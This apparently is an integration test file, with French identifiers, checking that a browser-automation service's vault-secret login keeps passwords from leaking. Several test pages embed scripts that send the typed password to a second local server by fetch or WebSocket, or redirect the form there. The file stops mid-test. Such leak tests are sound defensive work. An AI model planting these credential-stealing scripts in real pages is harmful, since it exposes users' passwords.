// SPDX-License-Identifier: MIT
// test/session_securisee.integration.test.js — connexion avec un secret du coffre (/login) sur un vrai Chromium, dans une session ordinaire : saisie, détection des champs, issue, documents remplacés, secret absent des réponses et du journal réseau, fuites bloquées, étape isolée (page rechargée, mocks suspendus, service workers, autres onglets figés, enregistrements refusés), outils libres avant et après, HTTP Basic/Digest, TLS.
//
//     node --test test/session_securisee.integration.test.js
//
// Sans les dépendances du service (npm ci) ou sans Chromium, tout est ignoré. Aucun accès réseau : serveurs d'essai sur 127.0.0.1.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import path from 'node:path';

import { demarrerService, raisonDeSauter } from './aides/service.js';

const SAUTER = await raisonDeSauter('chromium');
const SECRET = 'Mdp-tres-secret-42';
const IDENTIFIANT = 'alice.essai';
const ENCODAGES = [SECRET, encodeURIComponent(SECRET), Buffer.from(SECRET).toString('base64').replace(/=+$/, ''), Buffer.from(SECRET).toString('hex')];

let service = null;
let site = null;
let autre = null;
let tlsSite = null;
const recus = [];
const fuites = [];
const wsRecus = [];
let dernierMdp = '';
let n = 0;

const contient = (texte) => ENCODAGES.some((f) => String(texte).includes(f));
const corpsDe = (req) => new Promise((r) => { let b = ''; req.on('data', (d) => { b += d; }); req.on('end', () => r(b)); });
const md5 = (t) => createHash('md5').update(t).digest('hex');

// Formulaire de connexion : `script` ajouté en fin de page, attributs des champs et du formulaire réglables.
function formulaire({ methode = 'post', action = '/session', u = '', p = '', script = '', titre = 'Connexion' } = {}) {
    return `<title>${titre}</title><form${methode ? ` method="${methode}"` : ''} action="${action}">`
        + `<label>Identifiant <input name="u" type="text"${u}></label>`
        + `<label>Mot de passe <input name="p" type="password"${p}></label>`
        + `<button>Connexion</button></form>${script}`;
}

const SPA = `<title>SPA</title><div id="app"><label>Identifiant <input id="u" autocomplete="username"></label>
<label>Mot de passe <input id="p" type="password" autocomplete="current-password"></label><button id="b">Connexion</button>
<p id="msg" role="alert"></p></div><script>
const go = async () => {
  const r = await fetch('/api/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ u: u.value, p: p.value }) });
  if (r.ok) { history.pushState({}, '', '/dashboard'); document.getElementById('app').innerHTML = '<h1>Tableau de bord</h1>'; }
  else { msg.textContent = 'Mot de passe incorrect'; p.value = ''; }
};
b.onclick = go; p.addEventListener('keydown', (e) => { if (e.key === 'Enter') go(); });
</script>`;

// Réponse Digest (RFC 7616, MD5, qop=auth) valide pour l'identifiant d'essai.
function digestValide(req) {
    const h = req.headers.authorization || '';
    if (!h.startsWith('Digest ')) return false;
    const p = Object.fromEntries([...h.slice(7).matchAll(/(\w+)=(?:"([^"]*)"|([^,\s]*))/g)].map((m) => [m[1], m[2] ?? m[3]]));
    const ha1 = md5(`${IDENTIFIANT}:essai:${SECRET}`);
    const ha2 = md5(`${req.method}:${p.uri}`);
    return p.username === IDENTIFIANT && p.response === md5(`${ha1}:${p.nonce}:${p.nc}:${p.cnonce}:${p.qop}:${ha2}`);
}

async function ecouter(gerer, options = null) {
    const serveur = options ? https.createServer(options, gerer) : http.createServer(gerer);
    await new Promise((r) => serveur.listen(0, '127.0.0.1', r));
    return { serveur, base: `${options ? 'https' : 'http'}://127.0.0.1:${serveur.address().port}` };
}

// Certificat auto-signé pour 127.0.0.1 (openssl) ; null sans openssl.
function certificat() {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'elpis-tls-'));
    try {
        execFileSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-days', '1', '-subj', '/CN=127.0.0.1',
            '-addext', 'subjectAltName=IP:127.0.0.1', '-keyout', path.join(dir, 'k.pem'), '-out', path.join(dir, 'c.pem')], { stdio: 'ignore' });
        return { key: fs.readFileSync(path.join(dir, 'k.pem')), cert: fs.readFileSync(path.join(dir, 'c.pem')) };
    } catch (_) { return null; } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

before(async () => {
    if (SAUTER) return;
    autre = await ecouter(async (req, res) => {
        fuites.push(`${req.method} ${req.url} ${req.headers.authorization || ''} ${await corpsDe(req)}`);
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'access-control-allow-origin': '*' });
        if (req.url.startsWith('/cadre')) return res.end(`<title>Cadre</title><iframe src="${site.base}/login" width="600" height="300"></iframe>`);
        res.end(req.url.startsWith('/form') ? formulaire({ action: '/session' }) : 'ok');
    });
    // WebSocket minimal (RFC 6455, trames texte masquées du client) : relève chaque message reçu.
    autre.serveur.on('upgrade', (req, socket) => {
        const accept = createHash('sha1').update(`${req.headers['sec-websocket-key']}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest('base64');
        socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
        let tampon = Buffer.alloc(0);
        socket.on('error', () => {});
        socket.on('data', (d) => {
            tampon = Buffer.concat([tampon, d]);
            while (tampon.length >= 2) {
                let long = tampon[1] & 0x7f;
                let debut = 2;
                if (long === 126) { if (tampon.length < 4) return; long = tampon.readUInt16BE(2); debut = 4; }
                const masque = tampon[1] & 0x80 ? 4 : 0;
                if (long === 127 || tampon.length < debut + masque + long) return;
                const cle = tampon.subarray(debut, debut + masque);
                const charge = Buffer.from(tampon.subarray(debut + masque, debut + masque + long));
                if (masque) for (let i = 0; i < charge.length; i++) charge[i] ^= cle[i % 4];
                if ((tampon[0] & 0x0f) === 1) wsRecus.push(charge.toString('utf8'));
                if ((tampon[0] & 0x0f) === 8) socket.end();
                tampon = tampon.subarray(debut + masque + long);
            }
        });
    });
    site = await ecouter(async (req, res) => {
        const recu = await corpsDe(req);
        recus.push(`${req.method} ${req.url} ${recu}`);
        const chemin = req.url.split('?')[0];
        const champs = new URLSearchParams(recu);
        const bon = champs.get('u') === IDENTIFIANT && champs.get('p') === SECRET;
        if (req.method === 'POST' && champs.get('p')) dernierMdp = champs.get('p');
        const html = (code, corps, entetes = {}) => { res.writeHead(code, { 'content-type': 'text/html; charset=utf-8', ...entetes }); res.end(corps); };
        const pages = {
            '/login': () => formulaire(),
            '/login-auto': () => formulaire({ u: ' autocomplete="username"', p: ' autocomplete="current-password"' }).replace(/<label>[^<]*/g, '<label>'),
            '/login-prec': () => '<title>P</title><form method="post" action="/session"><input name="q" type="search"><input name="u" type="text"><input name="p" type="password"><button>Go</button></form>',
            '/login-email': () => '<title>E</title><form method="post" action="/session"><input name="u" type="email"><input name="p" type="password"><button>Go</button></form>',
            '/login-ambigu': () => formulaire() + formulaire({ action: '/inscription' }),
            '/login-fuite': () => formulaire({ script: `<script>document.querySelector('[name=p]').addEventListener('input', (e) => fetch('${autre.base}/fuite', { method: 'POST', mode: 'no-cors', body: e.target.value }).catch(() => {}))</script>` }),
            '/login-get': () => formulaire({ methode: null }),
            '/login-get-explicite': () => formulaire({ methode: 'get' }),
            '/login-ailleurs': () => formulaire({ action: `${autre.base}/vole` }),
            '/login-307': () => formulaire({ action: '/session-307' }),
            '/login-echo': () => formulaire({ action: '/session-echo' }),
            '/login-type': () => formulaire({ p: ' oninput="this.type=\'text\'"' }),
            '/login-console': () => formulaire({ script: "<script>document.querySelector('[name=p]').addEventListener('input', (e) => console.error('typed ' + e.target.value))</script>" }),
            '/login-lent': () => formulaire({ action: '/session-lent' }),
            '/login-iframe': () => `<title>Cadre</title><iframe src="${autre.base}/form" width="600" height="300"></iframe>`,
            '/login-srcdoc': () => `<title>Srcdoc</title><iframe width="600" height="300" srcdoc="${formulaire({ p: ' autocomplete=&quot;current-password&quot;' }).replace(/"/g, '&quot;')}"></iframe>`,
            '/spa': () => SPA,
            '/login-focus': () => formulaire({ p: ' oninput="document.getElementById(\'leurre\').focus()"', script: '<input id="leurre" aria-label="Leurre">' }),
            '/login-coupe': () => formulaire({ p: ' oninput="this.value = this.value.slice(0, 5)"' }),
            '/login-ping': () => formulaire({ script: `<script>document.querySelector('[name=p]').addEventListener('input', (e) => fetch('${autre.base}/ping?n=' + e.target.value.length, { mode: 'no-cors' }).catch(() => {}))</script>` }),
            '/login-bouton': () => formulaire().replace('<button>Connexion</button>', `<button formaction="${autre.base}/vole">Connexion</button>`),
            '/login-ws': () => formulaire({ script: `<script>const ws = new WebSocket('${autre.base.replace('http', 'ws')}/ws'); ws.onopen = () => ws.send('bonjour');
document.querySelector('[name=p]').addEventListener('input', (e) => { try { ws.send(e.target.value); } catch (_) {} });</script>` }),
            '/login-200': () => formulaire({ action: '/session-200' }),
            '/login-ok': () => formulaire({ action: '/session-any' }),
            '/login-sw': () => formulaire({ script: "<script>navigator.serviceWorker.register('/sw.js').catch(() => {})</script>" }),
            '/sonde-sw': () => 'RESEAU',
            '/onglets': () => '<title>Onglets</title><h1>Outils</h1>',
            '/home-any': () => '<title>Accueil</title><h1>Bienvenue</h1><input name="note" aria-label="Note">',
        };
        if (chemin === '/sw.js') {
            res.writeHead(200, { 'content-type': 'text/javascript' });
            return res.end("self.addEventListener('install', () => self.skipWaiting()); self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));"
                + "self.addEventListener('fetch', (e) => { if (e.request.url.endsWith('/sonde-sw')) e.respondWith(new Response('PAR-SW')); });");
        }
        if (req.method === 'GET' && pages[chemin]) return html(200, pages[chemin]());
        if (chemin === '/session' || chemin === '/session-lent') {
            if (chemin === '/session-lent') await new Promise((r) => setTimeout(r, 2500));
            if (bon) { res.writeHead(303, { location: '/home', 'set-cookie': 'sid=ok; Path=/; HttpOnly' }); return res.end(); }
            return html(200, formulaire({ script: '<p role="alert">Identifiants invalides</p>' }));
        }
        if (chemin === '/home') {
            if (!/(^|;\s*)sid=ok/.test(req.headers.cookie || '')) { res.writeHead(302, { location: '/login' }); return res.end(); }
            return html(200, '<title>Accueil</title><h1>Bienvenue</h1><p>Compte connecté</p>');
        }
        if (chemin === '/session-307') { res.writeHead(307, { location: `${autre.base}/vole` }); return res.end(); }
        if (chemin === '/session-200') return html(200, req.method === 'POST' && bon ? '<title>Bienvenue 200</title><h1>Bienvenue</h1>' : '<title>GET</title><h1>Page GET</h1>');
        if (chemin === '/session-any') { res.writeHead(303, { location: '/home-any' }); return res.end(); }
        if (chemin === '/session-echo') return html(200, `<title>Erreur</title><h1>Bienvenue</h1><input type="text" value="${dernierMdp}">`);
        if (chemin === '/api/login') {
            let j = {};
            try { j = JSON.parse(recu); } catch (_) { j = {}; }
            res.writeHead(j.u === IDENTIFIANT && j.p === SECRET ? 200 : 401, { 'content-type': 'application/json', 'set-cookie': 'sid=ok; Path=/' });
            return res.end('{}');
        }
        const basicOk = req.headers.authorization === `Basic ${Buffer.from(`${IDENTIFIANT}:${SECRET}`).toString('base64')}`;
        if (chemin === '/basic' && !basicOk) { res.writeHead(401, { 'www-authenticate': 'Basic realm="essai"' }); return res.end(); }
        if (chemin === '/digest' && !digestValide(req)) {
            res.writeHead(401, { 'www-authenticate': `Digest realm="essai", qop="auth", algorithm=MD5, nonce="${randomBytes(8).toString('hex')}"` });
            return res.end();
        }
        if (chemin === '/basic' || chemin === '/digest') return html(200, `<title>Protégé</title><h1>Accès ${chemin.slice(1)}</h1>`);
        return html(200, '<title>Accueil</title><h1>Bienvenue</h1>');
    });
    const cle = certificat();
    if (cle) tlsSite = await ecouter((req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>TLS</title><h1>Chiffré</h1>'); }, cle);
    service = await demarrerService({ env: { BROWSER_MAX_SESSIONS_PER_OWNER: '2' } });
});

after(async () => {
    if (service) await service.arreter();
    for (const s of [site, autre, tlsSite]) if (s) { s.serveur.closeAllConnections(); s.serveur.close(); }
});

// Propriétaire neuf par essai (quota par propriétaire à 2 dans ce service).
const proprio = () => `coffre${++n}`;

// Session ouverte pour un secret (politique TLS stricte) : ordinaire pour tout le reste.
async function ouvrir(owner, chemin, extra = {}) {
    const r = await service.post('/start', { owner, url: `${site.base}${chemin}`, tls: 'strict', ...extra });
    assert.equal(r.statut, 200, r.texte);
    assert.equal(r.corps.tls, 'strict');
    assert.equal(r.corps.secure, undefined);
    return r.corps.session_id;
}

const cibles = {
    username_target: { by_label: 'Identifiant' }, password_target: { by_label: 'Mot de passe' },
    submit_target: { by_role: 'button', by_name: 'Connexion' },
};

function connecter(owner, sid, extra = {}) {
    return service.post('/login', { owner, session_id: sid, secret_origin: site.base, username_value: IDENTIFIANT, password_value: SECRET, ...extra });
}

const arreter = (owner, sid) => service.post('/stop', { owner, session_id: sid });
const evaluer = (owner, sid, script) => service.post('/evaluate', { owner, session_id: sid, script });

test('connexion POST avec cibles : cookie posé, page d\'accueil atteinte, secret absent des réponses ; journal réseau sans corps ni requête porteuse', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const pre = await service.post('/login_precheck', { owner: o, session_id: sid, ...cibles });
    assert.equal(pre.statut, 200, pre.texte);
    assert.equal(pre.corps.frame_origin, site.base);
    assert.deepEqual(pre.corps.fields, ['username', 'password']);
    assert.deepEqual(pre.corps.detected, []);
    assert.equal(pre.corps.submit, true);
    assert.equal(pre.corps.targets.password.type, 'password');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.statut, 200, r.texte);
    assert.equal(r.corps.ok, true, r.texte);
    assert.equal(r.corps.outcome, 'navigated', r.texte);
    assert.equal(r.corps.navigated, true);
    assert.equal(r.corps.documents_replaced, 1);
    assert.equal(r.corps.secret_in_page, undefined);
    assert.match(r.corps.url, /\/home$/);
    assert.ok(!contient(r.texte));
    assert.ok(recus.some((l) => l.startsWith('POST /session') && l.includes(SECRET)), recus.join('\n'));
    const q = `owner=${o}&session_id=${sid}`;
    const lectures = [await service.post('/extract_text', { owner: o, session_id: sid }), await service.get(`/smart_inspect?${q}`),
        await service.get(`/observe?${q}`), await service.get(`/network?${q}`), await service.get(`/list_tabs?${q}`), await service.get(`/sessions?owner=${o}`)];
    for (const v of lectures) assert.ok(v.statut === 200 && !contient(v.texte), v.texte.slice(0, 300));
    assert.ok(lectures[0].texte.includes('Compte connecté'), lectures[0].texte);
    const reseau = lectures[3].corps.logs;
    assert.ok(!reseau.some((e) => e.method === 'POST' && e.url.endsWith('/session')), JSON.stringify(reseau));
    assert.ok(reseau.some((e) => e.url.endsWith('/home')), JSON.stringify(reseau));
    assert.ok(reseau.every((e) => !e.postData), JSON.stringify(reseau));
    await arreter(o, sid);
});

test('journal réseau : une requête faite pendant la connexion n\'y garde pas son corps ; hors connexion, les corps sont relevés', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/spa');
    await evaluer(o, sid, "return fetch('/api/login', { method: 'POST', body: JSON.stringify({ u: 'x', p: 'corps-avant' }) }).then((r) => r.status)");
    const ok = await connecter(o, sid);
    assert.equal(ok.corps.ok, true, ok.texte);
    await evaluer(o, sid, "return fetch('/api/login', { method: 'POST', body: JSON.stringify({ u: 'x', p: 'corps-apres' }) }).then((r) => r.status)");
    const reseau = (await service.get(`/network?owner=${o}&session_id=${sid}`)).corps.logs;
    const corps = reseau.filter((e) => e.method === 'POST').map((e) => e.postData);
    assert.ok(corps.some((c) => c && c.includes('corps-avant')) && corps.some((c) => c && c.includes('corps-apres')), JSON.stringify(reseau));
    assert.ok(!reseau.some((e) => contient(JSON.stringify(e))), JSON.stringify(reseau));
    assert.equal(reseau.filter((e) => e.method === 'POST').length, 2, JSON.stringify(reseau));
    await arreter(o, sid);
});

test('wait_for : la cible d\'arrivée confirme la connexion ; retour arrière ensuite : aucune lecture ne rend le secret', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const r = await connecter(o, sid, { ...cibles, wait_for: { by_role: 'heading', by_name: 'Bienvenue' } });
    assert.equal(r.statut, 200, r.texte);
    assert.equal(r.corps.outcome, 'wait_for');
    const retour = await service.post('/action', { owner: o, session_id: sid, type: 'back' });
    assert.ok(!contient(retour.texte), retour.texte);
    const q = `owner=${o}&session_id=${sid}`;
    for (const v of [await service.post('/extract_text', { owner: o, session_id: sid, include_hidden: true }), await service.get(`/smart_inspect?${q}`),
        await service.get(`/list_tabs?${q}`), await service.post('/screenshot', { owner: o, session_id: sid })]) {
        assert.equal(v.statut, 200, v.texte.slice(0, 300));
        assert.ok(!contient(v.texte), v.texte.slice(0, 300));
    }
    await arreter(o, sid);
});

test('champs détectés sans cible (autocomplete username/current-password) : précontrôle puis connexion', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-auto');
    const pre = await service.post('/login_precheck', { owner: o, session_id: sid });
    assert.equal(pre.statut, 200, pre.texte);
    assert.deepEqual(pre.corps.detected, ['username', 'password']);
    assert.equal(pre.corps.frame_origin, site.base);
    assert.equal(pre.corps.targets.username.autocomplete, 'username');
    const r = await connecter(o, sid);
    assert.equal(r.corps.ok, true, r.texte);
    assert.match(r.corps.url, /\/home$/);
    await arreter(o, sid);
});

test('champs détectés sans autocomplete : seul mot de passe visible et champ texte qui le précède dans le formulaire', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-prec');
    const r = await connecter(o, sid);
    assert.equal(r.corps.ok, true, r.texte);
    assert.deepEqual(r.corps.detected, ['username', 'password']);
    assert.match(r.corps.url, /\/home$/);
    await arreter(o, sid);
});

test('formulaire bloqué par la validation du navigateur (identifiant qui n\'est pas une adresse e-mail) : échec rapide, outcome form_invalid', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-email');
    const avant = recus.length;
    const t0 = Date.now();
    const r = await connecter(o, sid);
    assert.equal(r.statut, 422, r.texte);
    assert.equal(r.corps.code, 'secret_login_failed');
    assert.equal(r.corps.outcome, 'form_invalid');
    assert.ok(Date.now() - t0 < 10000, `${Date.now() - t0} ms`);
    assert.equal(recus.slice(avant).filter((l) => l.startsWith('POST')).length, 0);
    await arreter(o, sid);
});

test('détection ambiguë (deux formulaires à mot de passe) : 400 secret_target_required avec les candidats, rien de saisi', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-ambigu');
    const avant = recus.length;
    for (const route of ['/login_precheck', '/login']) {
        const r = route === '/login' ? await connecter(o, sid) : await service.post(route, { owner: o, session_id: sid });
        assert.equal(r.statut, 400, r.texte);
        assert.equal(r.corps.code, 'secret_target_required');
        assert.equal(r.corps.candidates.length, 2);
    }
    assert.equal(recus.slice(avant).filter((l) => l.startsWith('POST')).length, 0);
    await arreter(o, sid);
});

test('mauvais mot de passe, page serveur qui réaffiche le formulaire : 422 secret_login_failed, message de la page, champs vidés', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const r = await connecter(o, sid, { ...cibles, password_value: 'Faux-mot-de-passe-1' });
    assert.equal(r.statut, 422, r.texte);
    assert.equal(r.corps.code, 'secret_login_failed');
    assert.equal(r.corps.outcome, 'login_form_shown_again');
    assert.match(r.corps.page_message, /Identifiants invalides/);
    assert.ok(!r.texte.includes('Faux-mot-de-passe-1'));
    await arreter(o, sid);
});

test('SPA : succès (fetch POST puis pushState) et échec (formulaire resté, message) jugés sans navigation de document', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/spa');
    const echec = await connecter(o, sid, { password_value: 'Faux-mot-de-passe-2' });
    assert.equal(echec.statut, 422, echec.texte);
    assert.equal(echec.corps.code, 'secret_login_failed');
    assert.equal(echec.corps.outcome, 'no_change');
    assert.match(echec.corps.page_message, /Mot de passe incorrect/);
    assert.equal(echec.corps.documents_replaced, 1);
    const ok = await connecter(o, sid);
    assert.equal(ok.statut, 200, ok.texte);
    assert.equal(ok.corps.ok, true, ok.texte);
    assert.ok(recus.some((l) => l.startsWith('POST /api/login') && l.includes(SECRET)));
    const t = await service.post('/extract_text', { owner: o, session_id: sid });
    assert.ok(!contient(t.texte), t.texte.slice(0, 300));
    await arreter(o, sid);
});

test('script tiers qui recopie la saisie ailleurs : requête interrompue, 403 secret_scope_mismatch (outcome blocked)', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-fuite');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.statut, 403, r.texte);
    assert.equal(r.corps.code, 'secret_scope_mismatch');
    assert.equal(r.corps.outcome, 'blocked');
    assert.ok(!contient(r.texte));
    assert.ok(!fuites.some(contient), fuites.join('\n'));
    await arreter(o, sid);
});

test('formulaire GET implicite (sans method) : le secret ne part dans aucune adresse, connexion bloquée', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-get');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, false, r.texte);
    assert.equal(r.corps.code, 'secret_scope_mismatch');
    assert.ok(!recus.some((l) => l.startsWith('GET') && contient(l)), recus.join('\n'));
    await arreter(o, sid);
});

test('formulaire method=get ou action vers une autre origine : 403 secret_scope_mismatch avant toute saisie', { skip: SAUTER }, async () => {
    for (const chemin of ['/login-get-explicite', '/login-ailleurs']) {
        const o = proprio();
        const sid = await ouvrir(o, chemin);
        const r = await connecter(o, sid, cibles);
        assert.equal(r.statut, 403, `${chemin} ${r.texte}`);
        assert.equal(r.corps.code, 'secret_scope_mismatch');
        assert.equal(r.corps.documents_replaced, 0);
        const valeurs = await service.post('/element_info', { owner: o, session_id: sid, selector: 'input[name=u]' });
        assert.equal(valeurs.statut, 200, valeurs.texte);
        assert.equal(valeurs.corps.value, '', valeurs.texte);
        await arreter(o, sid);
    }
    assert.ok(!fuites.some(contient) && !recus.some((l) => l.startsWith('GET') && contient(l)));
});

test('307 vers une autre origine après la soumission : le corps ne la suit pas, connexion bloquée', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-307');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.outcome, 'blocked', r.texte);
    assert.equal(r.corps.code, 'secret_scope_mismatch');
    assert.ok(!fuites.some(contient), fuites.join('\n'));
    await arreter(o, sid);
});

test('formulaire dans une iframe d\'une autre origine, ou page de la bonne origine encadrée par une autre : 403 secret_scope_mismatch, rien de saisi', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-iframe');
    for (const r of [await service.post('/login_precheck', { owner: o, session_id: sid }), await connecter(o, sid, { secret_origin: autre.base })]) {
        assert.equal(r.statut, 403, r.texte);
        assert.equal(r.corps.code, 'secret_scope_mismatch');
    }
    await arreter(o, sid);
    const o2 = proprio();
    const encadree = await service.post('/start', { owner: o2, url: `${autre.base}/cadre`, tls: 'strict' });
    assert.equal(encadree.statut, 200, encadree.texte);
    const avant = recus.length;
    for (const r of [await service.post('/login_precheck', { owner: o2, session_id: encadree.corps.session_id }), await connecter(o2, encadree.corps.session_id)]) {
        assert.equal(r.statut, 403, r.texte);
        assert.equal(r.corps.code, 'secret_scope_mismatch');
    }
    assert.equal(recus.slice(avant).filter((l) => l.startsWith('POST')).length, 0);
    assert.ok(!fuites.some(contient), fuites.join('\n'));
    await arreter(o2, encadree.corps.session_id);
});

test('formulaire dans une iframe srcdoc (origine héritée, adresse about:srcdoc) : refusé', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-srcdoc');
    for (const r of [await service.post('/login_precheck', { owner: o, session_id: sid }), await connecter(o, sid)]) {
        assert.equal(r.statut, 403, r.texte);
        assert.equal(r.corps.code, 'secret_scope_mismatch');
    }
    await arreter(o, sid);
});

test('champ qui change de type à la saisie : vidé, 400 secret_target_required, document remplacé', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-type');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.statut, 400, r.texte);
    assert.equal(r.corps.code, 'secret_target_required');
    assert.equal(r.corps.documents_replaced, 1);
    const t = await service.post('/extract_text', { owner: o, session_id: sid, include_hidden: true });
    assert.ok(!contient(t.texte), t.texte.slice(0, 300));
    await arreter(o, sid);
});

test('site qui réaffiche le mot de passe après la connexion : la réponse de /login n\'en dit rien ; la page est celle du site (hors du périmètre)', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-echo');
    const r = await connecter(o, sid, cibles);
    assert.ok(!contient(r.texte), r.texte);
    assert.equal(r.corps.secret_in_page, undefined);
    const apres = await service.get(`/list_tabs?owner=${o}&session_id=${sid}`);
    assert.match(apres.corps.tabs[0].url, /\/session-echo$/);
    await arreter(o, sid);
});

test('journal console : la saisie recopiée par la page pendant la connexion est purgée avant d\'être gardée', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-console');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    const vue = await service.get(`/smart_inspect?owner=${o}&session_id=${sid}`);
    assert.ok(!contient(vue.texte) && !contient(service.journal()), vue.texte.slice(0, 300));
    await arreter(o, sid);
});

test('session ordinaire : eval, mocks, état, PDF, enregistreur et sélecteurs sur `value` permis avant et après la connexion ; /login sans politique TLS aussi', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const tour = async () => {
        const e = await evaluer(o, sid, 'return document.title');
        assert.equal(e.statut, 200, e.texte);
        for (const [route, corps] of [['/mock/add', { url_pattern: `${site.base}/rien`, status: 204 }], ['/mock/clear', {}], ['/save_state', {}],
            ['/print_pdf', {}], ['/recorder/start', {}], ['/recorder/stop', {}], ['/locator', { by_css: 'input[value]' }]]) {
            const r = await service.post(route, { owner: o, session_id: sid, ...corps });
            assert.ok(r.statut !== 403 && !String(r.corps?.code || '').startsWith('secret_'), `${route} ${r.texte.slice(0, 200)}`);
        }
        const l = await service.get(`/mock/list?owner=${o}&session_id=${sid}`);
        assert.equal(l.statut, 200, l.texte);
    };
    await tour();
    const ok = await connecter(o, sid, cibles);
    assert.equal(ok.corps.ok, true, ok.texte);
    await tour();
    const court = await connecter(o, sid, { ...cibles, password_value: 'ab' });
    assert.equal(court.statut, 400, court.texte);
    assert.equal(court.corps.code, 'secret_login_failed');
    await arreter(o, sid);
    const normale = await service.post('/start', { owner: o, url: `${site.base}/login`, isolated: true });
    assert.equal(normale.corps.tls, undefined);
    const r = await connecter(o, normale.corps.session_id, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    await arreter(o, normale.corps.session_id);
});

test('écouteur posé par eval avant la connexion : la page est rechargée depuis le réseau, il ne reçoit rien', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const pose = await evaluer(o, sid, `window.addEventListener('input', (e) => { localStorage.setItem('vu', (localStorage.getItem('vu') || '') + e.target.value); }, true);
        document.title = 'Modifiée'; return 'ok'`);
    assert.equal(pose.statut, 200, pose.texte);
    const n0 = recus.filter((l) => l.startsWith('GET /login ')).length;
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    assert.equal(recus.filter((l) => l.startsWith('GET /login ')).length, n0 + 1, 'page de connexion rechargée du réseau');
    const lu = await evaluer(o, sid, "return localStorage.getItem('vu')");
    assert.equal(lu.corps.result, null, lu.texte);
    await arreter(o, sid);
});

test('mock sur la page de connexion : suspendu pendant la connexion (vraie page, vrai POST), de nouveau actif ensuite', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login');
    const faux = formulaire({ titre: 'Fausse', script: "<script>addEventListener('input', (e) => localStorage.setItem('mock-vu', e.target.value), true)</script>" });
    const m = await service.post('/mock/add', { owner: o, session_id: sid, url_pattern: `${site.base}/login`, status: 200, content_type: 'text/html', body: faux });
    assert.equal(m.statut, 200, m.texte);
    await service.post('/action', { owner: o, session_id: sid, type: 'goto', url: `${site.base}/login` });
    assert.equal((await evaluer(o, sid, 'return document.title')).corps.result, 'Fausse');
    const n0 = recus.filter((l) => l.startsWith('POST /session ')).length;
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    assert.equal(recus.filter((l) => l.startsWith('POST /session ')).length, n0 + 1);
    assert.equal((await evaluer(o, sid, "return localStorage.getItem('mock-vu')")).corps.result, null);
    await service.post('/action', { owner: o, session_id: sid, type: 'goto', url: `${site.base}/login` });
    assert.equal((await evaluer(o, sid, 'return document.title')).corps.result, 'Fausse');
    assert.equal((await service.get(`/mock/list?owner=${o}&session_id=${sid}`)).corps.count, 1);
    await arreter(o, sid);
});

test('service worker de l\'origine : retiré avant la connexion, réenregistrement bloqué pendant', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/login-sw');
    const pret = await evaluer(o, sid, 'await navigator.serviceWorker.ready; return (await navigator.serviceWorker.getRegistrations()).length');
    assert.equal(pret.corps.result, 1, pret.texte);
    await service.post('/action', { owner: o, session_id: sid, type: 'reload' });
    assert.equal((await evaluer(o, sid, "return fetch('/sonde-sw').then((r) => r.text())")).corps.result, 'PAR-SW');
    const r = await connecter(o, sid, cibles);
    assert.equal(r.corps.ok, true, r.texte);
    const apres = await evaluer(o, sid, "return [(await navigator.serviceWorker.getRegistrations()).length, await fetch('/sonde-sw').then((r) => r.text())]");
    assert.deepEqual(apres.corps.result, [0, 'RESEAU'], apres.texte);
    await arreter(o, sid);
});

test('autre onglet de même origine qui lit le champ par une référence de fenêtre : figé pendant la connexion, il ne lit rien', { skip: SAUTER }, async () => {
    const o = proprio();
    const sid = await ouvrir(o, '/onglets');
    const pose = await evaluer(o, sid, `window.lu = []; window.w = window.open('${site.base}/login');
        setInterval(() => { try { const v = window.w.document.querySelector('[name=p]')?.value; if (v) window.lu.push(v); } catch (e) { window.lu.push('ERR'); } }, 20); return 'ok'`);
